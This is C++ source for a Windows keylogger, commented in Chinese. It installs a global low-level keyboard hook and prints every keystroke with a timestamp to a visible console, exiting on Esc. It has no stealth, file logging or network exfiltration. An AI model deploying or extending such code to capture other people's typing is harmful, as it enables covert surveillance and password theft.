/**
 * Windows键盘记录器 - 控制台输出版
 * 
 * 功能：记录用户的键盘输入并在控制台中显示
 * 使用方法：在Windows系统中编译并运行此程序，按ESC键退出
 * 
 * 编译命令：
 * cl keyboard_logger.cpp /link user32.lib
 */

#include <windows.h>
#include <stdio.h>
#include <time.h>

// 全局钩子句柄
HHOOK keyboardHook;

// 获取当前时间的格式化字符串
void getCurrentTime(char* buffer, size_t bufferSize) {
    time_t rawtime;
    struct tm timeinfo;
    
    time(&rawtime);
    localtime_s(&timeinfo, &rawtime);
    
    strftime(buffer, bufferSize, "%Y-%m-%d %H:%M:%S", &timeinfo);
}

// 将虚拟键码转换为可读字符串
void getKeyName(DWORD vkCode, char* buffer, size_t bufferSize) {
    switch (vkCode) {
        case VK_RETURN:
            strcpy_s(buffer, bufferSize, "Enter");
            break;
        case VK_ESCAPE:
            strcpy_s(buffer, bufferSize, "Esc");
            break;
        case VK_SPACE:
            strcpy_s(buffer, bufferSize, "Space");
            break;
        case VK_TAB:
            strcpy_s(buffer, bufferSize, "Tab");
            break;
        case VK_BACK:
            strcpy_s(buffer, bufferSize, "Backspace");
            break;
        case VK_SHIFT:
            strcpy_s(buffer, bufferSize, "Shift");
            break;
        case VK_CONTROL:
            strcpy_s(buffer, bufferSize, "Ctrl");
            break;
        case VK_MENU:
            strcpy_s(buffer, bufferSize, "Alt");
            break;
        case VK_CAPITAL:
            strcpy_s(buffer, bufferSize, "Caps Lock");
            break;
        case VK_LEFT:
            strcpy_s(buffer, bufferSize, "Left Arrow");
            break;
        case VK_RIGHT:
            strcpy_s(buffer, bufferSize, "Right Arrow");
            break;
        case VK_UP:
            strcpy_s(buffer, bufferSize, "Up Arrow");
            break;
        case VK_DOWN:
            strcpy_s(buffer, bufferSize, "Down Arrow");
            break;
        default:
            // 对于普通字符键，获取其对应的字符
            BYTE keyboardState[256] = {0};
            GetKeyboardState(keyboardState);
            
            // 设置Shift键状态
            keyboardState[VK_SHIFT] = (GetKeyState(VK_SHIFT) & 0x8000) ? 0x80 : 0;
            
            // 设置CapsLock状态
            keyboardState[VK_CAPITAL] = (GetKeyState(VK_CAPITAL) & 0x0001) ? 0x01 : 0;
            
            WORD character = 0;
            int result = ToAscii(vkCode, 0, keyboardState, &character, 0);
            
            if (result == 1) {
                sprintf_s(buffer, bufferSize, "%c", (char)character);
            } else {
                sprintf_s(buffer, bufferSize, "VK: 0x%02X", vkCode);
            }
            break;
    }
}

// 键盘钩子回调函数
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // 如果nCode小于0，必须调用CallNextHookEx
    if (nCode < 0) {
        return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
    }
    
    // 只处理按键按下事件
    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbStruct->vkCode;
        
        // 获取当前时间
        char timeBuffer[64];
        getCurrentTime(timeBuffer, sizeof(timeBuffer));
        
        // 获取按键名称
        char keyName[64];
        getKeyName(vkCode, keyName, sizeof(keyName));
        
        // 在控制台输出按键信息
        printf("[%s] 按键按下: %s\n", timeBuffer, keyName);
        
        // 如果按下ESC键，发送退出消息
        if (vkCode == VK_ESCAPE) {
            printf("[%s] 检测到Esc键，程序退出...\n", timeBuffer);
            PostQuitMessage(0);
        }
    }
    
    // 继续传递给下一个钩子
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

int main() {
    // 设置控制台编码为UTF-8，以正确显示中文
    // SetConsoleOutputCP(65001);
    
    printf("==================================================\n");
    printf("Windows键盘记录器 - 控制台输出版\n");
    printf("==================================================\n");
    printf("程序已启动，正在记录键盘输入...\n");
    printf("按下Esc键可退出程序\n");
    printf("--------------------------------------------------\n");
    
    // 获取当前模块句柄
    HINSTANCE hInstance = GetModuleHandle(NULL);
    
    // 安装低级键盘钩子
    keyboardHook = SetWindowsHookEx(
        WH_KEYBOARD_LL,      // 钩子类型：低级键盘
        KeyboardProc,        // 回调函数
        hInstance,           // 实例句柄
        0                    // 全局钩子
    );
    
    if (keyboardHook == NULL) {
        printf("安装键盘钩子失败，错误代码: %d\n", GetLastError());
        return 1;
    }
    
    // 消息循环
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // 卸载钩子
    UnhookWindowsHookEx(keyboardHook);
    
    printf("键盘记录器已停止\n");
    return 0;
}
